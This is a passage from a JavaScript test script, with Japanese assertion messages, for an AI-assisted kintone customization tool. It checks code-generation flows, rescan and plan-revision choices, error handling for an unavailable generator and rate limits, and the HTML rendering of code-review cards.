  assert(/data-act="rescan"/.test(m.chat()) && /新規 JS として設計/.test(m.chat()) && /手動で確認する/.test(m.chat()), '選択肢: 再スキャン / 新規 JS として設計 / 手動確認');
  await clickChat(m, 'rescan', { cid: 'C1' });
  await ticks(4);
  assert(available === true && m.calls.generate.length === 1 && m.calls.generate[0].ctx.existingFile?.source === FIELD_ON_OFF && m.panel.generated('C1')?.review.status === 'OK', '再スキャン → 本文を取得 → 同じカスタマイズのコードを生成（OK）');
  const m2 = mount({ inputs: INPUTS_CACHED, loadJsSource: async () => null });
  await ticks();
  await m2.panel.send(GOAL_HYBRID);
  await confirmSpec(m2);
  await m2.panel.send('コードを作って');
  await clickChat(m2, 'choice', { intent: 'REVISE_PLAN', text: 'C1 は既存ファイルに統合せず、新規の JS ファイルとして設計して' });
  assert(m2.calls.plan.length === 2 && m2.calls.plan[1].ctx.revision?.request.includes('新規の JS ファイルとして設計'), '「新規 JS として設計」→ 計画の修正（REVISE_PLAN）として Planner へ');
}
{
  const m = mount({ health: HEALTH_NO_GEN });
  await ticks();
  await m.panel.send(GOAL_HYBRID);
  await confirmSpec(m);
  const g = await m.panel.send('コードを作って');
  assert(g.ok === false && m.calls.generate.length === 0 && m.msgs().some(x => x.type === 'ERROR' && x.data.code === 'GENERATOR_NOT_AVAILABLE') && /JavaScript の生成」を利用できません/.test(m.chat()), '契約に customization-generator が無い: GENERATOR_NOT_AVAILABLE（Planner / Q&A は使える）');
  assert(m.panel.capability().features['customization-generator']?.available === false && m.panel.capability().features['change-planner']?.available === true, 'capability: generator だけ利用不可');
}
{
  const m = mount({ generateError: new KTAiClient.AiClientError({ code: KTAiClient.ERROR_CODES.RATE_LIMITED, message: 'rate', retryAfterSeconds: 30, requestId: 'gen-x' }) });
  await ticks();
  await m.panel.send(GOAL_HYBRID);
  await confirmSpec(m);
  const g = await m.panel.send('コードを作って');
  assert(g.ok === false && m.calls.generate.length === 1 && m.msgs().some(x => x.type === 'ERROR' && x.data.code === 'RATE_LIMITED' && x.data.retryText === 'コードを作って') && !m.panel.generated('C1'), 'Gateway の RATE_LIMITED: エラーカード（再試行）。生成結果は無い');
  assert(/data-act="retry"/.test(m.chat()) && /data-intent="GENERATE_CODE"/.test(m.chat()), '再試行ボタンは GENERATE_CODE を保持');
  assert(writes(m).length === 0, 'エラー時も書き込み 0 件');
}
{
  const m = mount({ planResponse: PLAN_STD });
  await ticks();
  await m.panel.send('承認済みの一覧を追加したい');
  const g = await m.panel.send('コードを作って');
  assert(g.intent === KTAiConversation.INTENT.GENERAL && m.calls.generate.length === 0, '標準設定だけの計画で「コードを作って」: カスタマイズが無い（GENERAL）');
  assert(!/JavaScript カスタマイズ/.test(KTAiChatUi.planCardHtml(m.conv().activePlan())) && /JavaScript カスタマイズはありません/.test(m.chat()) && !/kt-ai-review-hybrid/.test(m.$('kt-ai-plan-result').innerHTML), '標準のみの計画カード / Review は従来どおり（JS の段なし）。「コードを作って」には「カスタマイズはありません」と答える');
}

// =========================================================
console.log('\n--- §53-4. KTAiChatUi（純関数）---');
{
  const hy = reviewPlan(PLAN_HYBRID);
  const v = { planId: 'p', version: 1, status: 'ACTIVE', goal: GOAL_HYBRID, plan: hy.plan, review: hy.review, generated: {} };
  const card = KTAiChatUi.customizationCardHtml(hy.plan.customizations[0], hy.plan, { review: hy.jsReview });
  assert(/コード生成可/.test(card) && /✎ 既存 JS を変更: fieldOnOff\.js（PC）/.test(card), 'customizationCardHtml: 生成可バッジ・統合先');
  const cardNew = KTAiChatUi.customizationCardHtml(NEW_JS_CUST(), PLAN_NEW_JS.plan);
  assert(/＋ 新規 JS/.test(cardNew) && /app\.record\.create\.change\.amount/.test(cardNew), 'customizationCardHtml（新規 JS）');
  const m = { id: 'x', role: 'toolkit', type: 'CODE', text: 'JavaScript', data: { planId: 'p', version: 1, customizationId: 'C1' } };
  const noGen = KTAiChatUi.messageHtml(m, { plans: new Map([['p:1', v]]) });
  assert(/JavaScript/.test(noGen) && !/Toolkit Code Review/.test(noGen), '生成結果が無い CODE メッセージは文章だけ');
  const rv = KTCodeReview.review({ generated: genPatch(), customization: hy.plan.customizations[0], plan: hy.plan, data: INPUTS.data, scan: INPUTS.scan, existingSource: SRC });
  v.generated.C1 = { generated: genPatch(), review: rv, existingSource: SRC };
  const withGen = KTAiChatUi.messageHtml(m, { plans: new Map([['p:1', v]]) });
  assert(/kt-ai-code-card/.test(withGen) && /✓ 検査を通過/.test(withGen) && /✓ Patch/.test(withGen) && /✓ Syntax/.test(withGen), 'codeCardHtml: Toolkit Code Review の ✓ 一覧');
  const pane = KTAiChatUi.codePaneHtml(v.generated.C1, { view: 'diff' });
  assert(pane.code === rv.finalCode && /^\+/m.test(pane.diff) && /fieldOnOff\.js/.test(pane.head), 'codePaneHtml: code / diff / head');
  assert(KTAiChatUi.STRATEGY_JA.EXTEND_EXISTING_JS === '✎ 既存 JS を変更' && KTAiChatUi.STRATEGY_JA.NEW_JS_FILE === '＋ 新規 JS', 'STRATEGY_JA');
}

console.log(`\n${state.failed ? 'FAILED' : 'ALL PASSED'}: ${state.passed} passed / ${state.failed} failed`);
process.exit(state.failed ? 1 : 0);
})().catch(e => { console.error(e); process.exit(1); });
